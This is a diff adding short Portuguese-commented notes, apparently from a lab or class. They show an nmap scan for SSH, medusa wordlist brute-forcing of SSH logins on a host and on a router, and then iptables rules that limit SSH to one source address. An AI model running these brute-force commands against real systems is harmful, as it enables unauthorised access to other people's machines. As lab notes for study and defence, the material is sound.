@@ -1,0 +1,22 @@
+nmap -p 22 192.168.1.0/24
+
+medusa -h 192.168.1.222 -u robot -P wordlist.txt -N ssh -v 6 -f
+
+ssh robot@192.168.1.222
+................................................................
+
+*em um roteador
+
+medusa -h 192.168.1.1 -u admin -P wordlist.txt -N ssh -v 6 -f
+
+ssh admin@192.168.1.1
+
+..........................................................
+
+*para barrar
+
+apt install iptables
+
+iptables -A INPUT -p tcp -s 192.168.1.12 --dport 22 -j ACCEPT
+
+iptables -A INPUT -p tcp  --dport 22 -j DROP
